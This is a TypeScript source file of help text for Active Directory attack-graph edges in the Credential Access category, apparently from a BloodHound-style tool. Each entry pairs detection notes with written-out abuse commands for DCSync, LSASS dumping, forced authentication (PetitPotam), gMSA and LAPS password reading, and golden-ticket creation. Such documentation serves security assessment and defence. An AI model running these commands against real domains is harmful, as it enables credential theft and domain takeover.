import type { EdgeHelpText } from './types';

export const adCredentialAccessEdges: EdgeHelpText[] = [
  {
    kind: 'CoerceToTGT',
    category: 'Credential Access',
    general:
      'The CoerceToTGT edge indicates that a principal can coerce a target computer to authenticate to an attacker-controlled destination, enabling the capture of a TGT for the target computer account. This is typically achieved through coercion techniques like PetitPotam (MS-EFSRPC), PrinterBug/SpoolSample (MS-RPRN), or DFSCoerce (MS-DFSNM). The captured TGT can then be used to impersonate the target computer account, which is particularly impactful when targeting Domain Controllers because the DC computer account has DCSync-equivalent privileges.',
    windowsAbuse: `# PetitPotam - Coerce authentication via MS-EFSRPC
# Requires a listener (e.g., Rubeus or ntlmrelayx)
PetitPotam.exe <listener-ip> <target-dc>

# SpoolSample / PrinterBug - Coerce authentication via MS-RPRN
SpoolSample.exe <target-dc> <listener-ip>

# Using Rubeus to monitor for and capture the TGT
Rubeus.exe monitor /interval:5 /nowrap

# Using Rubeus to perform an unconstrained delegation attack
# (if the listener is a machine with unconstrained delegation)
Rubeus.exe monitor /interval:5 /nowrap /targetuser:DC01$

# After capturing the TGT, inject it
Rubeus.exe ptt /ticket:<base64-ticket>

# Then perform DCSync with the DC machine account's TGT
mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt`,
    linuxAbuse: `# PetitPotam from Linux
python3 PetitPotam.py <listener-ip> <target-dc>

# DFSCoerce from Linux
python3 dfscoerce.py -u attacker -p 'Password' -d domain.local <listener-ip> <target-dc>

# PrinterBug from Linux
python3 printerbug.py domain.local/attacker:'Password'@<target-dc> <listener-ip>

# Using Coercer (unified coercion tool)
coercer coerce -u attacker -p 'Password' -d domain.local -l <listener-ip> -t <target-dc>

# Capture and relay with ntlmrelayx (for NTLM relay to LDAP for RBCD)
ntlmrelayx.py -t ldap://dc.domain.local --delegate-access --escalate-user attacker

# Or capture and relay for shadow credentials
ntlmrelayx.py -t ldap://dc.domain.local --shadow-credentials --shadow-target 'DC01$'

# Using krbrelayx to capture the TGT (unconstrained delegation scenario)
krbrelayx.py -hashes :NTHASH`,
    opsec:
      'Coercion attempts generate network connections from the target to the attacker listener, which may be visible in network monitoring. PetitPotam uses MS-EFSRPC over SMB (port 445) or RPC. SpoolSample uses MS-RPRN. The resulting authentication generates Event ID 4624 (Logon) on the listener. If relayed to LDAP for RBCD, Event ID 5136 (Directory object modified) is generated when the msDS-AllowedToActOnBehalfOfOtherIdentity attribute is set. If the captured TGT is used for DCSync, Event ID 4662 with the Replicating Directory Changes Extended Right GUID is generated. Monitor for unusual outbound SMB connections from Domain Controllers.',
    references: [
      {
        title: 'SpecterOps - PetitPotam and ADCS',
        url: 'https://posts.specterops.io/certified-pre-owned-d95910965cd2',
      },
      {
        title: 'The Hacker Recipes - Coerced Authentication',
        url: 'https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications',
      },
      {
        title: 'HackTricks - Printer Bug',
        url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/printers-spooler-service-abuse.html',
      },
    ],
  },
  {
    kind: 'DCSync',
    category: 'Credential Access',
    general:
      'The DCSync edge indicates that a principal has the necessary replication permissions to perform a DCSync attack against the domain. DCSync uses the Directory Replication Service (MS-DRSR) protocol to request credential data from a Domain Controller, simulating the behavior of a DC requesting replication. This requires the Replicating Directory Changes and Replicating Directory Changes All extended rights on the domain object. A successful DCSync retrieves the NTLM hash, Kerberos keys, and password history for any account in the domain, including the krbtgt account needed for Golden Ticket attacks.',
    windowsAbuse: `# Using Mimikatz to perform DCSync
# Dump a specific user's credentials
mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt
mimikatz # lsadump::dcsync /domain:domain.local /user:administrator

# Dump all accounts
mimikatz # lsadump::dcsync /domain:domain.local /all /csv

# Using PowerView to check who has DCSync rights
Get-ObjectAcl -DistinguishedName "DC=domain,DC=local" -ResolveGUIDs | ? {($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')}

# After obtaining the krbtgt hash, create a Golden Ticket
mimikatz # kerberos::golden /user:administrator /domain:domain.local /sid:S-1-5-21-<domain-sid> /krbtgt:<krbtgt-hash> /ptt`,
    linuxAbuse: `# Using impacket's secretsdump.py for DCSync
secretsdump.py domain.local/attacker:'Password'@dc.domain.local -just-dc

# Dump specific user only
secretsdump.py domain.local/attacker:'Password'@dc.domain.local -just-dc-user krbtgt

# Dump NTDS with password history
secretsdump.py domain.local/attacker:'Password'@dc.domain.local -just-dc -history

# Using Pass-the-Hash for DCSync
secretsdump.py -hashes :NTHASH domain.local/attacker@dc.domain.local -just-dc

# After obtaining krbtgt hash, create Golden Ticket with impacket
ticketer.py -nthash <krbtgt-hash> -domain-sid S-1-5-21-<domain-sid> -domain domain.local administrator
export KRB5CCNAME=administrator.ccache`,
    opsec:
      'DCSync generates Event ID 4662 (An operation was performed on an object) with the following Access Mask and GUIDs: Replicating Directory Changes (1131f6aa-9c07-11d1-f79f-00c04fc2dcd2) and Replicating Directory Changes All (1131f6ad-9c07-11d1-f79f-00c04fc2dcd2). The event will show the requesting account. This is the primary detection mechanism and should trigger high-priority alerts when the source is not a Domain Controller. Event ID 4624 (Logon) type 3 will also be generated for the network authentication to the DC. Network-level detection can identify DRS traffic from non-DC sources by monitoring for RPC calls to the DRSUAPI interface.',
    references: [
      {
        title: 'BloodHound Documentation - DCSync',
        url: 'https://support.bloodhoundenterprise.io/hc/en-us/articles/17312785326235-DCSync',
      },
      {
        title: 'adsecurity.org - Mimikatz DCSync',
        url: 'https://adsecurity.org/?p=1729',
      },
      {
        title: 'The Hacker Recipes - DCSync',
        url: 'https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync',
      },
      {
        title: 'HackTricks - DCSync',
        url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/dcsync.html',
      },
    ],
  },
  {
    kind: 'DumpSMSAPassword',
    category: 'Credential Access',
    general:
      'The DumpSMSAPassword edge indicates that a principal has the ability to retrieve the password of a Standalone Managed Service Account (sMSA). sMSAs have their passwords stored in the AD database and can be retrieved by principals with the necessary permissions. Unlike Group Managed Service Accounts (gMSAs) which use a key distribution mechanism, sMSA passwords are stored similarly to regular user passwords. If an attacker can read the sMSA password, they can authenticate as that service account and access any resources it has permissions to.',
    windowsAbuse: `# Using Mimikatz to dump sMSA credentials from a DC
mimikatz # lsadump::dcsync /domain:domain.local /user:sMSAAccount$

# If you have local admin on the machine where the sMSA is installed
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::secrets

# Using PowerView to find sMSAs
Get-DomainObject -LDAPFilter '(objectClass=msDS-ManagedServiceAccount)' -Properties samaccountname,msds-managedpasswordid`,
    linuxAbuse: `# Using impacket's secretsdump.py to dump sMSA credentials
secretsdump.py domain.local/attacker:'Password'@dc.domain.local -just-dc-user 'sMSAAccount$'

# Enumerate managed service accounts
python3 -c "
import ldap3
server = ldap3.Server('dc.domain.local')
conn = ldap3.Connection(server, 'domain\\\\attacker', 'Password', auto_bind=True)
conn.search('DC=domain,DC=local', '(objectClass=msDS-ManagedServiceAccount)', attributes=['sAMAccountName'])
for entry in conn.entries:
    print(entry)
"`,
    opsec:
      'Dumping an sMSA password via DCSync generates the same Event ID 4662 (Directory replication) events as any DCSync operation. If dumped from a local machine, the LSA secrets access generates Event ID 4656 (A handle to an object was requested) and Event ID 4663 (An attempt was made to access an object) for the SAM/SECURITY registry hives. Monitor for unusual access to service account credentials, particularly from non-service-account workstations.',
    references: [
      {
        title: 'BloodHound Documentation - DumpSMSAPassword',
        url: 'https://support.bloodhoundenterprise.io/hc/en-us/articles/17312790870555-DumpSMSAPassword',
      },
      {
        title: 'Microsoft - Managed Service Accounts',
        url: 'https://learn.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/getting-started-with-group-managed-service-accounts',
      },
    ],
  },
  {
    kind: 'HasSession',
    category: 'Credential Access',
    general:
      'The HasSession edge indicates that a user has an active or recent logon session on a target computer. When a user logs into a Windows system, their credentials (NTLM hashes and/or Kerberos tickets) are cached in memory (LSASS). An attacker with local administrator access on that computer can extract these cached credentials to impersonate the logged-in user. This is a fundamental component of the credential theft attack chain in Active Directory environments and is the primary mechanism by which BloodHound identifies lateral movement paths.',
    windowsAbuse: `# If you have local admin on the target where the user has a session:

# Using Mimikatz to extract credentials from LSASS
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords

# Using Mimikatz to extract Kerberos tickets
mimikatz # sekurlsa::tickets /export

# Using Rubeus to extract Kerberos tickets from memory
Rubeus.exe triage
Rubeus.exe dump /nowrap

# Using procdump to dump LSASS for offline extraction
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Then extract credentials offline
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords`,
    linuxAbuse: `# Using impacket's secretsdump.py to remotely dump credentials
secretsdump.py domain.local/attacker:'Password'@target.domain.local

# Using CrackMapExec to dump credentials
crackmapexec smb target.domain.local -u attacker -p 'Password' --lsa
crackmapexec smb target.domain.local -u attacker -p 'Password' -M lsassy

# Using lsassy for targeted LSASS credential extraction
lsassy -u attacker -p 'Password' -d domain.local target.domain.local

# Using impacket with Pass-the-Hash
secretsdump.py -hashes :NTHASH domain.local/attacker@target.domain.local`,
    opsec:
      'Credential dumping from LSASS generates Event ID 4656 (A handle to an object was requested) and Event ID 4663 (An attempt was made to access an object) for the lsass.exe process, if process access auditing is enabled. Event ID 10 (Process Access) in Sysmon logs is a primary detection mechanism for LSASS access. Remote credential dumping via secretsdump generates Event ID 4624 (Logon) type 3 and may trigger service creation events (Event ID 7045) if using the RemoteRegistry or similar services. Credential Guard on Windows 10+ prevents LSASS credential extraction. Protected Process Light (PPL) on LSASS adds an additional barrier.',
    references: [
      {
        title: 'BloodHound Documentation - HasSession',
        url: 'https://support.bloodhoundenterprise.io/hc/en-us/articles/17312798834459-HasSession',
      },
      {
        title: 'adsecurity.org - Credential Dumping',
        url: 'https://adsecurity.org/?p=2398',
      },
      {
        title: 'The Hacker Recipes - Credential Dumping',
        url: 'https://www.thehacker.recipes/ad/movement/credentials/dumping',
      },
    ],
  },
  {
    kind: 'ReadGMSAPassword',
    category: 'Credential Access',
    general:
      'The ReadGMSAPassword edge indicates that a principal is authorized to read the managed password of a Group Managed Service Account (gMSA). gMSA passwords are 256-byte randomly generated values that are automatically rotated by Active Directory. The msDS-GroupMSAMembership attribute on the gMSA defines which principals can retrieve the password. An attacker who can read the gMSA password can authenticate as that service account. gMSAs are often configured with significant privileges because they typically run critical services, making this a high-value credential access path.',
    windowsAbuse: `# Using DSInternals to read the gMSA password
Install-Module DSInternals -Force
$gmsa = Get-ADServiceAccount -Identity gmsaAccount -Properties 'msDS-ManagedPassword'
$mp = $gmsa.'msDS-ManagedPassword'
$securePassword = (ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword

# Using GMSAPasswordReader
GMSAPasswordReader.exe --AccountName gmsaAccount

# Using PowerView and manual conversion
$gmsa = Get-DomainObject -Identity gmsaAccount -Properties 'msds-managedpassword'
$blob = $gmsa.'msds-managedpassword'
# Parse the blob to extract the NT hash

# Using the NT hash with Rubeus
Rubeus.exe asktgt /user:gmsaAccount$ /rc4:<nt-hash> /nowrap`,
    linuxAbuse: `# Using gMSADumper
python3 gMSADumper.py -u attacker -p 'Password' -d domain.local -l dc.domain.local

# Using bloodyAD
bloodyAD -d domain.local -u attacker -p 'Password' --host dc.domain.local get object 'gmsaAccount$' --attr msDS-ManagedPassword

# Using impacket (with the extracted NT hash)
getTGT.py domain.local/'gmsaAccount$' -hashes :NTHASH -dc-ip dc.domain.local

# Using CrackMapExec with gMSA module
crackmapexec ldap dc.domain.local -u attacker -p 'Password' --gmsa

# Using netexec
netexec ldap dc.domain.local -u attacker -p 'Password' --gmsa`,
    opsec:
      'Reading the gMSA password attribute generates Event ID 4662 (An operation was performed on an object) with the msDS-ManagedPassword attribute GUID. This is a legitimate operation when performed by authorized service accounts or computers but should be monitored when the requesting principal is unexpected. Event ID 4624 (Logon) will be generated when the extracted credentials are used for authentication. Since gMSA passwords are long random values, any TGT requested for a gMSA account from an unexpected source IP should be investigated.',
    references: [
      {
        title: 'BloodHound Documentation - ReadGMSAPassword',
        url: 'https://support.bloodhoundenterprise.io/hc/en-us/articles/17312842105243-ReadGMSAPassword',
      },
      {
        title: 'SpecterOps - gMSA Abuse',
        url: 'https://posts.specterops.io/an-introduction-to-manual-and-automated-analysis-of-group-managed-service-accounts-gmsa-passwords-26c7b4e8e5e',
      },
      {
        title: 'The Hacker Recipes - gMSA',
        url: 'https://www.thehacker.recipes/ad/movement/credentials/dumping/gmsa',
      },
    ],
  },
  {
    kind: 'ReadLAPSPassword',
    category: 'Credential Access',
    general:
      'The ReadLAPSPassword edge indicates that a principal can read the Local Administrator Password Solution (LAPS) managed password for a target computer. LAPS automatically rotates the local administrator password on domain-joined computers and stores it in a confidential attribute (ms-Mcs-AdmPwd for legacy LAPS, or msLAPS-Password for Windows LAPS) on the computer object in AD. Principals with read access to this attribute can retrieve the plaintext local admin password. This provides local administrator access to the target computer, enabling credential harvesting and lateral movement.',
    windowsAbuse: `# Using the LAPS PowerShell module
Get-ADComputer -Identity target -Properties ms-Mcs-AdmPwd | Select-Object -ExpandProperty ms-Mcs-AdmPwd

# Using PowerView
Get-DomainComputer target -Properties ms-mcs-admpwd | Select-Object -ExpandProperty ms-mcs-admpwd

# For Windows LAPS (new version)
Get-LapsADPassword -Identity target -AsPlainText

# Using the LAPS UI tool
# Launch LAPS UI and search for the computer name

# Using native LDAP query
([adsisearcher]"(&(objectCategory=computer)(name=target))").FindAll() | % { $_.Properties['ms-mcs-admpwd'] }

# After retrieving the password, use it for lateral movement
Enter-PSSession -ComputerName target.domain.local -Credential (New-Object PSCredential("target\\Administrator", (ConvertTo-SecureString '<laps-password>' -AsPlainText -Force)))`,
    linuxAbuse: `# Using CrackMapExec / NetExec
crackmapexec ldap dc.domain.local -u attacker -p 'Password' --module laps
netexec ldap dc.domain.local -u attacker -p 'Password' -M laps

# Using bloodyAD
bloodyAD -d domain.local -u attacker -p 'Password' --host dc.domain.local get object 'target$' --attr ms-Mcs-AdmPwd

# Using pyLAPS
python3 pyLAPS.py --action get -d domain.local -u attacker -p 'Password' --dc-ip dc.domain.local

# Using LAPSDumper
python3 laps.py -u attacker -p 'Password' -d domain.local

# After retrieving the password, use it for lateral movement
psexec.py 'target/Administrator':'<laps-password>'@target.domain.local`,
    opsec:
      'Reading the LAPS password attribute generates Event ID 4662 (An operation was performed on an object) with the ms-Mcs-AdmPwd attribute GUID when detailed AD auditing is enabled. The Microsoft LAPS operational log (Microsoft-Windows-LAPS/Operational) records Event ID 10 when a LAPS password is retrieved. Monitor for principals reading LAPS attributes that are not in the expected administrators or helpdesk groups. Using the retrieved password generates Event ID 4624 (Logon) with the local Administrator account on the target.',
    references: [
      {
        title: 'BloodHound Documentation - ReadLAPSPassword',
        url: 'https://support.bloodhoundenterprise.io/hc/en-us/articles/17312842528027-ReadLAPSPassword',
      },
      {
        title: 'The Hacker Recipes - LAPS',
        url: 'https://www.thehacker.recipes/ad/movement/credentials/dumping/laps',
      },
      {
        title: 'HackTricks - LAPS',
        url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/laps.html',
      },
    ],
  },
  {
    kind: 'SyncLAPSPassword',
    category: 'Credential Access',
    general:
      'The SyncLAPSPassword edge indicates that a principal has permissions to trigger an immediate LAPS password rotation and synchronization for a target computer. This is specific to the newer Windows LAPS implementation which supports password encryption and Azure AD backup. An attacker with this permission can force a password rotation, causing the computer to generate a new local admin password and store it in AD where the attacker can then read it (if they also have ReadLAPSPassword rights). Even without read rights, the rotation itself can be used to deny access to legitimate administrators by invalidating the current password.',
    windowsAbuse: `# Using Windows LAPS PowerShell cmdlet to trigger password rotation
Reset-LapsPassword -Identity target

# Invoke the LAPS password update policy via Group Policy
Invoke-GPUpdate -Computer target.domain.local -Force

# Using Set-LapsADResetPassword (Windows LAPS)
Set-LapsADResetPassword -Identity target

# After rotation, read the new password (requires ReadLAPSPassword)
Get-LapsADPassword -Identity target -AsPlainText`,
    linuxAbuse: `# Using bloodyAD to trigger LAPS password rotation
bloodyAD -d domain.local -u attacker -p 'Password' --host dc.domain.local set object 'target$' --attr msLAPS-PasswordExpirationTime --value 0

# This sets the password expiration to epoch 0, forcing the next LAPS cycle to rotate the password
# The new password can then be read if the attacker has ReadLAPSPassword permissions

# Using pywerview to modify the expiration
set-domainobject -Identity 'target$' -Set @{'msLAPS-PasswordExpirationTime'='0'} -Server dc.domain.local -User attacker -Password 'Password'`,
    opsec:
      'Forcing a LAPS password rotation generates events in the Microsoft-Windows-LAPS/Operational log, including Event ID 10 (Password update) on the target computer. The attribute modification to msLAPS-PasswordExpirationTime generates Event ID 5136 (A directory service object was modified). Monitor for unexpected LAPS password rotations, especially those triggered by non-administrative accounts. The subsequent password read will generate the same events as ReadLAPSPassword.',
    references: [
      {
        title: 'BloodHound Documentation - SyncLAPSPassword',
        url: 'https://support.bloodhoundenterprise.io/hc/en-us/articles/17312849891483-SyncLAPSPassword',
      },
      {
        title: 'Microsoft - Windows LAPS',
        url: 'https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview',
      },
    ],
  },
];
